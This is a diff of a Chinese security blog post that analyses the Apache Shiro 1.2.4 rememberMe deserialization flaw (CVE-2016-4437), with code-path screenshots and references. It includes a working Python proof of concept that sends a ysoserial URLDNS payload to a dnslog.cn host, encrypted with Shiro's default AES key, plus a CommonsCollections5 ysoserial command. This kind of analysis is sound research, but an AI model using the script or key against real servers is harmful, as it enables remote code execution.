+<p>getCookie 构造方法先获取 cookie 信息,readValue 方法，根据 Cookie 中的 name 字段获取 Cookie 的值，然后返回 Cookie 的值<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170622.png"></p>
+<p>然后调用 <code>byte[] decoded = Base64.decode(base64)</code>处理 base64 加密的 Cookie 信息，并且将这个 Cookie 转化为二进制字节码<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901170847.png"></p>
+<p>回到 getRememberedPrincipals，继续跟进 convertBytesToPrincipals 函数<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901171410.png"></p>
+<p>AES 解密  <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200901171905.png"></p>
+<p>反序列化 <code>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902114203.png"><br><code>org.apache.shiro.io.DefaultSerializer#deserialize</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902114258.png"><br>看到 <code>readObject()</code></p>
 <p>当我们发送带有 readmemberMe  cookie的请求，后端会进行如下操作。</p>
 <ul>
 <li>读取 cookie 中 rememberMe 的值</li>
@@ -195,48 +145,34 @@ forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<
 </ul>
 <figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">target = <span class="string">"http://localhost:8080/samples_web_war/"</span></span><br><span class="line">jar_file = <span class="string">'F:\\Penetration\\ysoserial\\ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,jar_file, <span class="string">"URLDNS"</span>, <span class="string">"http://7zhfmm.dnslog.cn"</span>],</span><br><span class="line">                        stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送request</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(target, cookies={<span class="string">'rememberMe'</span>:base64_ciphertext.decode()}, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></tbody></table></div></figure>
 
+
         <h2 id="漏洞利用">
           <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>漏洞利用</h2>
       
-
         <h3 id="commons-collections-3-2-1">
           <a href="#commons-collections-3-2-1" class="heading-link"><i class="fas fa-link"></i></a>commons-collections 3.2.1</h3>
-      
-<p>shiro自带的commons-collections-3.2.1 、commons-beanutils-1.8.3<br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902170609.png" alt=""></p>
+      <p>shiro自带的commons-collections-3.2.1 、commons-beanutils-1.8.3<br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902170609.png"></p>
 <p>在JDK1.8u112中，可以直接利用 ysoserial 中的Commons-Collections5（3.1-3.2.1，jdk1.8）</p>
 <figure class="highlight shell"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "clac"</span><br></pre></td></tr></tbody></table></div></figure>
-<p>会报错提示</p>
+<p>会报错提示   </p>
 <blockquote>
-<p>org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.</p>
+<p>org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.   </p>
 </blockquote>
-<p>回到  <code>org.apache.shiro.io.DefaultSerializer#deserialize</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903105958.png" alt=""></p>
+<p>回到  <code>org.apache.shiro.io.DefaultSerializer#deserialize</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903105958.png"></p>
 <p>我们发现在这里使用了 <code>ClassResolvingObjectInputStream</code> 类而非传统的 <code>ObjectInputStream</code></p>
-<p><code>org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902171556.png" alt=""></p>
-<p><strong><code>java.io.ObjectInputStream#resolveClass</code></strong><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902171935.png" alt=""></p>
+<p><code>org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902171556.png"></p>
+<p><strong><code>java.io.ObjectInputStream#resolveClass</code></strong><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200902171935.png"></p>
 <p><code>ObjectInputStream</code> 的 resolveClass 函数用的是Class.forName 类获取当前描述器所指代的类的Class对象</p>
 <p>shiro 中 <code>ClassResolvingObjectInputStream</code> 继承了 ObjectInputStream，resolveClass 被重写，调用了 ClassUtils.forName 获取当前描述器所指代的类的Class对象</p>
-<p><code>org.apache.shiro.util.ClassUtils#forName</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903110745.png" alt=""><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903111934.png" alt=""><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903111120.png" alt=""></p>
-<p>看一下 <code>ExceptionIgnoringAccessor</code> 是如何是实现的<br>
-<code>org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor</code><br>
-<img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903112157.png" alt=""></p>
+<p><code>org.apache.shiro.util.ClassUtils#forName</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903110745.png"><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903111934.png"><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903111120.png"></p>
+<p>看一下 <code>ExceptionIgnoringAccessor</code> 是如何是实现的<br><code>org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor</code><br><img src="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20200903112157.png"></p>
 
         <h3 id="commons-collections-4-0">
           <a href="#commons-collections-4-0" class="heading-link"><i class="fas fa-link"></i></a>commons-collections 4.0</h3>
       
-
         <h2 id="参考文章">
           <a href="#参考文章" class="heading-link"><i class="fas fa-link"></i></a>参考文章</h2>
-      
-<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">Apache Shiro Java反序列化漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
-<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/">Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>
-<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">Apache Shiro Java反序列化漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/">Shiro 1.2.4 RememberMe反序列化漏洞踩坑分析(CVE-2016-4437)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">Pwn a CTF Platform with Java JRMP Gadget</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -255,7 +191,7 @@ forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<
             });
             document.body.appendChild(img);
           });
-      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/"><span class="paginator-prev__text">相关函数总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">
+      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Wordpress file manager插件命令执行</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/"><span class="paginator-prev__text">相关函数总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">
           漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">
           漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">
           加密过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">
@@ -263,4 +199,4 @@ forgetIdentity 针对 subject 变量进行处理，跟进 forgetIdentity 方法<
           漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#commons-collections-3-2-1"><span class="toc-number">3.1.</span> <span class="toc-text">
           commons-collections 3.2.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#commons-collections-4-0"><span class="toc-number">3.2.</span> <span class="toc-text">
           commons-collections 4.0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">
-          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
+          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
